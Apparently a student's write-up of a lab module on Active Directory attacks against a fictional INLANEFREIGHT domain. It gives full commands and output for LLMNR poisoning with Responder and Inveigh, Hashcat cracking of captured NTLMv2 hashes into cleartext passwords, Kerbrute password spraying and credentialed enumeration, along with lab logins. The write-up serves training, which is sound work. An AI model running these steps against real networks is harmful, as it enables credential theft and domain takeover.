# Active Directory Enumeration & Attacks
Active Directory (AD) is the leading enterprise domain management suite, providing identity and access management, centralized domain administration, authentication, and much more. Due to the many features and complexity of AD, it presents a large attack surface that is difficult to secure properly. To be successful as infosec professionals, we must understand AD architectures and how to secure our enterprise environments. As Penetration testers, having a firm grasp of what tools, techniques, and procedures are available to us for enumerating and attacking AD environments and commonly seen AD misconfigurations is a must.

## Scenario


We are Penetration Testers working for CAT-5 Security. After a few successful engagements shadowing with the team, the more senior members want to see how well we can do starting an assessment on our own. The team lead sent us the following email detailing what we need to accomplish.

[![Screenshot-2025-03-13-085033.png](https://i.postimg.cc/QCyFjLYL/Screenshot-2025-03-13-085033.png)](https://postimg.cc/BP2SCzGN)

This module will allow us to practice our skills (both prior and newly minted) with these tasks. The final assessment for this module is the execution of two internal penetration tests against the company Inlanefreight. During these assessments, we will work through an internal penetration test simulating starting from an external breach position and a second one beginning with an attack box inside the internal network as clients often request. Completing the skills assessments signifies the successful completion of the tasks mentioned in the scoping document and tasking email above. In doing so, we will demonstrate a firm grasp of many automated and manual AD attack and enumeration concepts, knowledge of and experience with a wide array of tools, and the ability to interpret data gathered from an AD environment to make critical decisions to advance the assessment. The content in this module is meant to cover core enumeration concepts necessary for anyone to be successful in performing internal penetration tests in Active Directory environments. We will also cover many of the most common attack techniques in great depth while working through some more advanced concepts as a primer for AD-focused material that will be covered in more advanced modules.

Below you will find a completed scoping document for the engagement containing all pertinent information provided by the customer.

### Assessment Scope
The following IPs, hosts, and domains defined below make up the scope of the assessment.

**In Scope For Assessment**
Range/Domain	Description
- INLANEFREIGHT.LOCAL	Customer domain to include AD and web services.
- LOGISTICS.INLANEFREIGHT.LOCAL	Customer subdomain
- FREIGHTLOGISTICS.LOCAL	Subsidiary company owned by Inlanefreight. External forest trust with INLANEFREIGHT.LOCAL
- 172.16.5.0/23	In-scope internal subnet.


**Out Of Scope**
- Any other subdomains of INLANEFREIGHT.LOCAL
- Any subdomains of FREIGHTLOGISTICS.LOCAL
- Any phishing or social engineering attacks
- Any other IPS/domains/subdomains not explicitly mentioned
- Any types of attacks against the real-world inlanefreight.com website outside of passive enumeration shown in this module

### Methods Used
The following methods are authorized for assessing Inlanefreight and its systems :

**External Information Gathering (Passive Checks)**
External information gathering is authorized to demonstrate the risks associated with information that can be gathered about the company from the internet. To simulate a real-world attack, CAT-5 and its assessors will conduct external information gathering from an anonymous perspective on the internet with no information provided in advance regarding Inlanefreight outside of what is provided within this document.

Cat-5 will perform passive enumeration to uncover information that may help with internal testing. Testing will employ various degrees of information gathering from open-source resources to identify publicly accessible data that may pose a risk to Inlanefreight and assist with the internal penetration test. No active enumeration, port scans, or attacks will be performed against internet-facing "real-world" IP addresses or the website located at https://www.inlanefreight.com.

**Internal Testing**
The internal assessment portion is designed to demonstrate the risks associated with vulnerabilities on internal hosts and services ( Active Directory specifically) by attempting to emulate attack vectors from within Inlanefreight's area of operations. The result will allow Inlanefreight to assess the risks of internal vulnerabilities and the potential impact of a successfully exploited vulnerability.

To simulate a real-world attack, Cat-5 will conduct the assessment from an untrusted insider perspective with no advance information outside of what's provided in this documentation and discovered from external testing. Testing will start from an anonymous position on the internal network with the goal of obtaining domain user credentials, enumerating the internal domain, gaining a foothold, and moving laterally and vertically to achieve compromise of all in-scope internal domains. Computer systems and network operations will not be intentionally interrupted during the test.

**Password Testing**
Password files captured from Inlanefreight devices, or provided by the organization, may be loaded onto offline workstations for decryption and utilized to gain further access and accomplish the assessment goals. At no time will a captured password file or the decrypted passwords be revealed to persons not officially participating in the assessment. All data will be stored securely on Cat-5 owned and approved systems and retained for a period of time defined in the official contract between Cat-5 and Inlanefreight.

We provided the above scoping documentation so we become used to seeing this style of documentation. As we progress through our Infosec Careers, especially on the offensive side, it will be common to receive scoping documents and Rules of Engagement (RoE) documents that outline these types of information.

The Stage Is Set
Now that we have our scope clearly defined for this module, we can dive into exploring Active Directory enumeration and attack vectors. Now, let's dive into performing passive external enumeration against Inlanefreight.

# Questions and Answers

## External Recon and Enumeration Principles

* **While looking at inlanefreights public records; A flag can be seen. Find the flag and submit it. ( format == HTB{******} )**
For this task, I took advanted of the BGP Toolkit by Hurricane Electric. In the search bar, I entered the target domain: *inlanefreight.com*

Once the domain page loaded, I browsed to the DNS Records section. Under the TXT Records, I found the following information:

[![Screenshot-2025-03-13-090412.png](https://i.postimg.cc/X71P62Vw/Screenshot-2025-03-13-090412.png)](https://postimg.cc/LnfDz3gX)

## Initial Enumeration of the Domain

* **From your scans, what is the "commonName" of host 172.16.5.5 ?**

For this task, I performed a detailed network scan against the targets that we discovered earlier to identify open ports and extract the host information. I used Nmap with aggressive scanning enabled to perform service detection, OS fingerprinting, script scanning, and version detection:

```c
sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum
```

One of the open ports returned important information about the host 172.16.5.5. By running the rdp-ntlm-info script, Nmap was able to extract additional details from the Remote Desktop Protocol (RDP) service on port 3389:

```c
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: ACADEMY-EA-DC01
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|   DNS_Computer_Name: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
|   Product_Version: 10.0.17763
|_  System_Time: 2025-03-13T14:32:31+00:00
|_ssl-date: 2025-03-13T14:32:39+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
| Issuer: commonName=ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-02-11T06:08:03
| Not valid after:  2025-08-13T06:08:03
| MD5:   ab1f 46b2 cf15 74bc e1e1 b183 c5ef 902e
|_SHA-1: bd7b cfa2 bd90 7dd4 a546 2552 6d1f 5537 77e7 b659
```


* **What host is running "Microsoft SQL Server 2019 15.00.2000.00"? (IP address, not Resolved name)**

From the previous Nmap scan results, I identified that the host 172.16.5.130 is running Microsoft SQL Server 2019, version 15.00.2000.00.

```c
Nmap scan report for 172.16.5.130
Host is up (0.0014s latency).
Not shown: 992 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
808/tcp   open  ccproxy-http?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
```


## LLMNR/NBT-NS Poisoning - from Linux

* **Run Responder and obtain a hash for a user account that starts with the letter b. Submit the account name as your answer.**

I started Responder on the interface connected to the target network.
```c
sudo responder -I ens224 -wf
```
After running Responder for several minutes, it successfully captured an NTLM hash for the user account backupagent

[![Screenshot-2025-03-13-141104.png](https://i.postimg.cc/Vkh6N70q/Screenshot-2025-03-13-141104.png)](https://postimg.cc/PCmh3Q4J)


* **Crack the hash for the previous account and submit the cleartext password as your answer.**

After successfully capturing the hash using Responder, I proceeded with cracking it. I navigated to Responder's Logs Directory in /usr/share/responder/logs. I extracted the NTLMv2 hash from the file and saved it into a new file named hash.txt on my attack machine for cracking.

I used Hashcat, specifying the mode for NTLMv2 hashes (-m 5600), along with the rockyou.txt wordlist.
```c
hashcat -m 5600 -a 0 -o cracked.txt hash.txt /usr/share/wordlists/rockyou.txt
```

After Hashcat finished processing, I reviewed the results by displaying the contents of cracked.txt:
```c
cat cracked.txt

BACKUPAGENT::INLANEFREIGHT:6b6fa02e047a9ef4:5f2b8a134304247569905d3f187b8678:010100000000000080a267f81f94db010f58d0f6b87a15bc0000000002000800410055003500340001001e00570049004e002d004a005900560048004b0035005200590036004700530004003400570049004e002d004a005900560048004b003500520059003600470053002e0041005500350034002e004c004f00430041004c000300140041005500350034002e004c004f00430041004c000500140041005500350034002e004c004f00430041004c000700080080a267f81f94db010600040002000000080030003000000000000000000000000030000002d9fd7ffabf78ce55e4568fbe3ba65c01c67b75b7bee7c2347f528ecc254dba0a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:h1backup55
```

[![Screenshot-2025-03-13-142515.png](https://i.postimg.cc/7Yd8GjXZ/Screenshot-2025-03-13-142515.png)](https://postimg.cc/D8rYRjt9)

**Run Responder and obtain an NTLMv2 hash for the user wley. Crack the hash using Hashcat and submit the user's password as your answer.**

While running Responder during the previous task, I had already captured an NTLMv2 hash for the user **wley**. I copied the captured hash from Responder’s logs and saved it into a new file called hash2.txt on my attack machine.
```c
hashcat -m 5600 -a 0 -o cracked2.txt hash2.txt /usr/share/wordlists/rockyou.txt
```
Once Hashcat completed the cracking process, I reviewed the results by running:

```c
cat cracked2.txt
WLEY::INLANEFREIGHT:6c0dde4851063a3b:9e405760f4fca4e917989d53b08cfdf8:010100000000000080a267f81f94db0145080a739104b4e60000000002000800410055003500340001001e00570049004e002d004a005900560048004b0035005200590036004700530004003400570049004e002d004a005900560048004b003500520059003600470053002e0041005500350034002e004c004f00430041004c000300140041005500350034002e004c004f00430041004c000500140041005500350034002e004c004f00430041004c000700080080a267f81f94db010600040002000000080030003000000000000000000000000030000002d9fd7ffabf78ce55e4568fbe3ba65c01c67b75b7bee7c2347f528ecc254dba0a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:transporter@4
```
[![Screenshot-2025-03-13-143007.png](https://i.postimg.cc/6qqgThvZ/Screenshot-2025-03-13-143007.png)](https://postimg.cc/gL9NT84c)


## LLMNR/NBT-NS Poisoning - from Windows

* **Run Inveigh and capture the NTLMv2 hash for the svc_qualys account. Crack and submit the cleartext password as the answer.**

I initiated an RDP connection to the target Windows host 10.129.145.5 using xfreerdp with the provided credentials:
```c
xfreerdp /v:10.129.145.5 /u:htb-student /p:Academy_student_AD!
```
Once connected, I launched PowerShell with administrative privileges, navigated to the C:\Tools directory, and executed Inveigh:
```c
PS C:\Tools> .\Inveigh.exe

[*] Inveigh 2.0.4 [Started 2025-03-14T05:40:50 | PID 2520]
[+] Packet Sniffer Addresses [IP 172.16.5.25 | IPv6 fe80::e401:bd43:c7d0:fcc%8]
[+] Listener Addresses [IP 0.0.0.0 | IPv6 ::]
[+] Spoofer Reply Addresses [IP 172.16.5.25 | IPv6 fe80::e401:bd43:c7d0:fcc%8]
[+] Spoofer Options [Repeat Enabled | Local Attacks Disabled]
[ ] DHCPv6
[+] DNS Packet Sniffer [Type A]
[ ] ICMPv6
[+] LLMNR Packet Sniffer [Type A]
[ ] MDNS
[ ] NBNS
[+] HTTP Listener [HTTPAuth NTLM | WPADAuth NTLM | Port 80]
[ ] HTTPS
[+] WebDAV [WebDAVAuth NTLM]
[ ] Proxy
[+] LDAP Listener [Port 389]
[+] SMB Packet Sniffer [Port 445]
[+] File Output [C:\Tools]
[+] Previous Session Files [Imported]
[*] Press ESC to enter/exit interactive console
[!] Failed to start HTTP listener on port 80, check IP and port usage.
[!] Failed to start HTTPv6 listener on port 80, check IP and port usage.
```
After a few minutes, I pressed ESC to enter interactive mode. Once inside, I used the GET NTLMV2UNIQUE command to display the captured hashes.
```c
C(0:0) NTLMv1(0:0) NTLMv2(6:99)>GET NTLMV2UNIQUE

Hashes
===============================================================================================================================================
lab_adm::INLANEFREIGHT:A6D095B424C91B46:70DB5276AFCCA73C584052456200DD1A:01010000000000000DA2C736DE94DB01D88A6B37A32C04110000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00070008000DA2C736DE94DB0106000400020000000800300030000000000000000000000000300000B3517A0E8ED7E6D67EA022F0B1F9C03843CD9B804D89BE630D8A8FCA650A8D2B0A001000000000000000000000000000000000000900280063006900660073002F00610063006100640065006D0079002D00650061002D0077006500620030000000000000000000
clusteragent::INLANEFREIGHT:EE5175D9264A6798:A2C9AC3DD9D72D6E5A512DB245711E81:0101000000000000600C3D39DE94DB014F2F26EB970221550000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0007000800600C3D39DE94DB0106000400020000000800300030000000000000000000000000300000B3517A0E8ED7E6D67EA022F0B1F9C03843CD9B804D89BE630D8A8FCA650A8D2B0A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000
backupagent::INLANEFREIGHT:D467610D69581F80:2106E3A29CC9C27DC2BFFE2BE496B14C:0101000000000000F3C32259DE94DB01F73222F55C56CAD70000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0007000800F3C32259DE94DB0106000400020000000800300030000000000000000000000000300000B3517A0E8ED7E6D67EA022F0B1F9C03843CD9B804D89BE630D8A8FCA650A8D2B0A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000
svc_qualys::INLANEFREIGHT:5CB2C5BC321A876A:4B659B343655147DADA26C4E21EDE70D:01010000000000006FE2F15CDE94DB019440B1162DC10E410000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00070008006FE2F15CDE94DB0106000400020000000800300030000000000000000000000000300000B3517A0E8ED7E6D67EA022F0B1F9C03843CD9B804D89BE630D8A8FCA650A8D2B0A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000
forend::INLANEFREIGHT:6B0A501B15EE3D3E:5F66562619519130C3AE78AEF0F40A92:01010000000000007B984864DE94DB01A9F0F81E6A58AB6B0000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00070008007B984864DE94DB0106000400020000000800300030000000000000000000000000300000B3517A0E8ED7E6D67EA022F0B1F9C03843CD9B804D89BE630D8A8FCA650A8D2B0A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000
```

I copied the captured hash from svc_qualys and saved it into a new file called svc_hash.txt on my attack machine. I used Hashcat, specifying the mode for NTLMv2 hashes (-m 5600), along with the rockyou.txt wordlist.
```c
hashcat -m 5600 -a 0 -o svc_cracked.txt svc_hash.txt /usr/share/wordlists/rockyou.txt
```

Once Hashcat completed the cracking process, I reviewed the results by running:
```c
cat svc_cracked.txt
SVC_QUALYS::INLANEFREIGHT:5cb2c5bc321a876a:4b659b343655147dada26c4e21ede70d:01010000000000006fe2f15cde94db019440b1162dc10e410000000002001a0049004e004c0041004e004500460052004500490047004800540001001e00410043004100440045004d0059002d00450041002d004d005300300031000400260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c0003004600410043004100440045004d0059002d00450041002d004d005300300031002e0049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c000500260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c00070008006fe2f15cde94db0106000400020000000800300030000000000000000000000000300000b3517a0e8ed7e6d67ea022f0b1f9c03843cd9b804d89be630d8a8fca650a8d2b0a001000000000000000000000000000000000000900200063006900660073002f003100370032002e00310036002e0035002e00320035000000000000000000:security#1
```

## Enumerating & Retrieving Password Policies

>*SSH to 10.129.67.132 (ACADEMY-EA-ATTACK01) with user "htb-student" and password "HTB_@cademy_stdnt!"*

* **What is the default Minimum password length when a new domain is created? (One number)**

This answer was given throughout the lecture. The default password policy when a new domain is created is as follows, and there have been plenty of organizations that never changed this policy:
Minimum password length	7 

* **What is the minPwdLength set to in the INLANEFREIGHT.LOCAL domain? (One number)**

I started by connecting to the target machine at 10.129.167.132 via SSH, using the provided credentials. Once connected, I ran ifconfig to identify the available network interfaces and their respective IP addresses:
```c
─[htb-student@ea-attack01]─[~]
└──╼ $ifconfig
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:43:49:a1:9c  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.67.132  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 dead:beef::2055:97c0:f1ab:ad95  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::ff38:fdaa:b937:bf38  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b0:a9:7a  txqueuelen 1000  (Ethernet)
        RX packets 22873  bytes 2099329 (2.0 MiB)
        RX errors 0  dropped 340  overruns 0  frame 0
        TX packets 1041  bytes 120087 (117.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens224: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.5.225  netmask 255.255.254.0  broadcast 172.16.5.255
        inet6 fe80::32e6:baa0:e3aa:25da  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b0:f5:68  txqueuelen 1000  (Ethernet)
        RX packets 815  bytes 52054 (50.8 KiB)
        RX errors 0  dropped 6  overruns 0  frame 0
        TX packets 45  bytes 3622 (3.5 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 20  bytes 1200 (1.1 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1200 (1.1 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Next, I performed a ping sweep on the 172.16.5.0/24 range to discover other active hosts on the network
```c
for ip in $(seq 1 254); do
    ping -c 1 -W 1 172.16.5.$ip | grep "bytes from" &
done
wait
```
This revealed two new active ip addresses 172.16.5.5 and 172.16.5.225. I then ran enum4linux to enumerate the domain:
```c
enum4linux-ng -P 172.16.5.5 -oA ilfreight

 =================================================
|    Domain Information via RPC for 172.16.5.5    |
 =================================================
[+] Domain: INLANEFREIGHT
[+] SID: S-1-5-21-3842939050-3880317879-2865463114
[+] Host is part of a domain (not a workgroup)

 =========================================================
|    Domain Information via SMB session for 172.16.5.5    |
 =========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: ACADEMY-EA-DC01
NetBIOS domain name: INLANEFREIGHT
DNS domain: INLANEFREIGHT.LOCAL
FQDN: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL


 =======================================
|    Policies via RPC for 172.16.5.5    |
 =======================================
[*] Trying port 445/tcp
[+] Found policy:
domain_password_information:
  pw_history_length: 24
  min_pw_length: 8
  min_pw_age: 1 day 4 minutes
  max_pw_age: not set
  pw_properties:
  - DOMAIN_PASSWORD_COMPLEX: true
  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false
  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false
  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false
  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false
  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false
domain_lockout_information:
  lockout_observation_window: 30 minutes
  lockout_duration: 30 minutes
  lockout_threshold: 5
domain_logoff_information:
  force_logoff_time: not set

Completed after 5.35 seconds
```
  
## Password Spraying - Making a Target User List

> SSH to 10.129.67.220 (ACADEMY-EA-ATTACK01) with user "htb-student" and password "HTB_@cademy_stdnt!"

* **Enumerate valid usernames using Kerbrute and the wordlist located at /opt/jsmith.txt on the ATTACK01 host. How many valid usernames can we enumerate with just this wordlist from an unauthenticated standpoint?**

I started by connecting to the target machine at 10.129.167.132 via SSH, using the provided credentials. Once connected, I ran Kerbrute: 
```c
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

This gave me the following results: 
```c
<snip>
2025/03/14 11:26:19 >  [+] VALID USERNAME:	 ngriffith@inlanefreight.local
2025/03/14 11:26:19 >  [+] VALID USERNAME:	 sinman@inlanefreight.local
2025/03/14 11:26:19 >  [+] VALID USERNAME:	 minman@inlanefreight.local
2025/03/14 11:26:19 >  [+] VALID USERNAME:	 rhester@inlanefreight.local
2025/03/14 11:26:19 >  [+] VALID USERNAME:	 rburrows@inlanefreight.local
2025/03/14 11:26:20 >  [+] VALID USERNAME:	 dpalacios@inlanefreight.local
2025/03/14 11:26:21 >  [+] VALID USERNAME:	 strent@inlanefreight.local
2025/03/14 11:26:21 >  [+] VALID USERNAME:	 fanthony@inlanefreight.local
2025/03/14 11:26:22 >  [+] VALID USERNAME:	 evalentin@inlanefreight.local
2025/03/14 11:26:22 >  [+] VALID USERNAME:	 sgage@inlanefreight.local
2025/03/14 11:26:22 >  [+] VALID USERNAME:	 jshay@inlanefreight.local
2025/03/14 11:26:23 >  [+] VALID USERNAME:	 jhermann@inlanefreight.local
2025/03/14 11:26:23 >  [+] VALID USERNAME:	 whouse@inlanefreight.local
2025/03/14 11:26:24 >  [+] VALID USERNAME:	 emercer@inlanefreight.local
2025/03/14 11:26:25 >  [+] VALID USERNAME:	 wshepherd@inlanefreight.local
2025/03/14 11:26:25 >  Done! Tested 48705 usernames (56 valid) in 14.542 seconds
```

## Internal Password Spraying - from Linux
> SSH to 10.129.22.33 (ACADEMY-EA-ATTACK01) with user "htb-student" and password "HTB_@cademy_stdnt!"

* **Find the user account starting with the letter "s" that has the password Welcome1. Submit the username as your answer.**

Using the list of valid usernames we collected in the previous step, I ran Kerbrute to perform a password spray attack.
```c
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```
Kerbrute returned a valid login that starts with the letter "s", confirming the user has the password Welcome1.

[![Screenshot-2025-03-14-134928.png](https://i.postimg.cc/020jMgBq/Screenshot-2025-03-14-134928.png)](https://postimg.cc/bsdpW5P6)


## Internal Password Spraying - from Windows

> RDP to 10.129.208.127 (ACADEMY-EA-MS01) with user "htb-student" and password "Academy_student_AD!"

* **Using the examples shown in this section, find a user with the password Winter2022. Submit the username as the answer.**

I initiated an RDP connection to the target Windows host 10.129.9.169 using xfreerdp with the provided credentials:

```c
xfreerdp /v:10.129.9.169 /u:htb-student /p:Academy_student_AD!
```
Once connected, I launched PowerShell with administrative privileges, navigated to the C:\Tools directory, and executed DomainPasswordSpray.ps1:
```c
PS C:\Tools> Import-Module .\DomainPasswordSpray.ps1
PS C:\Tools> Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue
```

The DomainPasswordSpray attack successfully discovered a user account with the password "Winter2022".

[![Screenshot-2025-03-14-143415.png](https://i.postimg.cc/dV4Vt8SR/Screenshot-2025-03-14-143415.png)](https://postimg.cc/VJ08Kbw5)


## Credentialed Enumeration - from Linux

* **What AD User has a RID equal to Decimal 1170?**
>  SSH to 10.129.241.55 (ACADEMY-EA-ATTACK01) with user "htb-student" and password "HTB_@cademy_stdnt!"

I started by connecting to the target machine at 10.129.167.132 via SSH, using the provided credentials. Once connected, I ran rpcclient:
```c
  rpcclient -U "" -N 172.16.5.5
```
Next, I converted the given decimal value (1170) to its hexadecimal equivalent, 0x492. I then proceeded to run the query user command.
```c
rpcclient $> queryuser 0x492
User Name   :	mmorgan
	Full Name   :	Matthew Morgan
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	Thu, 10 Mar 2022 14:48:06 EST
	Logoff Time              :	Wed, 31 Dec 1969 19:00:00 EST
	Kickoff Time             :	Wed, 31 Dec 1969 19:00:00 EST
	Password last set Time   :	Tue, 05 Apr 2022 15:34:55 EDT
	Password can change Time :	Wed, 06 Apr 2022 15:34:55 EDT
	Password must change Time:	Wed, 13 Sep 30828 22:48:05 EDT
	unknown_2[0..31]...
	user_rid :	0x492
	group_rid:	0x201
	acb_info :	0x00010210
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000000
	logon_count:	0x00000018
	padding1[0..7]...
	logon_hrs[0..21]...
```

* **What is the membercount: of the "Interns" group?**

To answer this question, I ran CrackMapExec using the following command:
```c
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups

<snip>
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Shared Calendar Read                     membercount: 1
SMB         172.16.5.5      445    ACADEMY-EA-DC01  VPN Users                                membercount: 1
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Interns                                  membercount: 10
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Website Admin                            membercount: 0
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Barracuda_all_access                     membercount: 0
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Supervisors Warehouse                    membercount: 15
SMB         172.16.5.5      445    ACADEMY-EA-DC01  QA_users                                 membercount: 0
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Calendar Access                          membercount: 0
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Nars360_users                            membercount: 0
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Finance_billing_ilfreight                membercount: 6
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Nas Group                                membercount: 0
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Front Desk                               membercount: 6
<snip>
```


## Credentialed Enumeration - from Windows

>  RDP to 10.129.119.210 (ACADEMY-EA-MS01) with user "htb-student" and password "Academy_student_AD!"

* ** Using Bloodhound, determine how many Kerberoastable accounts exist within the INLANEFREIGHT domain. (Submit the number as the answer)**

I initiated an RDP connection to the target Windows host 10.129.119.210 using xfreerdp with the provided credentials:

```c 
xfreerdp /v:10.129.119.210 /u:htb-student /p:Academy_student_AD!
```

Once connected, I launched PowerShell with administrative privileges, navigated to the C:\Tools directory, and executed SharpHounde.exe with the command:

```c
 .\SharpHound.exe -c All --zipfilename ILFREIGHT
```

I proceeded to open BloodHound with:
```c
PS C:\Tools> bloodhound
```
Once on the interface I uploaded the data I exported: 

[![Screenshot-2025-03-17-104655.png](https://i.postimg.cc/rprxRh62/Screenshot-2025-03-17-104655.png)](https://postimg.cc/wt97SQTw)

I navigated to the Analysis tab and clicked on **List All Kerberoastable Accounts** 


[![Screenshot-2025-03-17-105013.png](https://i.postimg.cc/d197Gp4p/Screenshot-2025-03-17-105013.png)](https://postimg.cc/ftJTN24f)

* ** What PowerView function allows us to test if a user has administrative access to a local or remote host?**

This was mentioned on the lecture: 
**Test-AdminAccess** - Tests if the current user has administrative access to the local (or a remote) machine.

* **Run Snaffler and hunt for a readable web config file. What is the name of the user in the connection string within the file?**

Inside PowerShell I executed Snaffler with: 
```c
.\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data
```

This showed me the username in the connection string and also the password for it. 

[![Screenshot-2025-03-17-110600.png](https://i.postimg.cc/Hsn2s9Ld/Screenshot-2025-03-17-110600.png)](https://postimg.cc/crqYFYYb)

* **What is the password for the database user?**

We got the answer from this question on the previous question. 

## Living Off the Land

>  RDP to 10.129.143.146 (ACADEMY-EA-MS01) with user "htb-student" and password "Academy_student_AD!"

* **Enumerate the host's security configuration information and provide its AMProductVersion.**

I initiated an RDP connection to the target Windows host 10.129.119.210 using xfreerdp with the provided credentials:

```c 
xfreerdp /v:10.129.143.146 /u:htb-student /p:Academy_student_AD!
```

Once connected, I launched PowerShell with administrative privileges and executed:
```c
PS C:\Windows\system32> Get-MpComputerStatus | Select-Object AMProductVersion

AMProductVersion
----------------
4.18.2109.6

```

* **What domain user is explicitly listed as a member of the local Administrators group on the target host?**

  For this question I executed the following command on PowerShell:
  
 ```c

 PS C:\Windows\system32> Get-LocalGroupMember -Group "Administrators" 

ObjectClass Name                          PrincipalSource
----------- ----                          ---------------
User        ACADEMY-EA-MS01\Administrator Local
User        INLANEFREIGHT\adunn           ActiveDirectory
Group       INLANEFREIGHT\Domain Admins   ActiveDirectory
Group       INLANEFREIGHT\Domain Users    ActiveDirectory

```

* **Utilizing techniques learned in this section, find the flag hidden in the description field of a disabled account with administrative privileges. Submit the flag as the answer.**
  For this question I executed the following command on PowerShell:
```c
PS C:\Windows\system32> dsquery user -disabled -desc * | dsget user -samid -desc
  desc                                                        samid
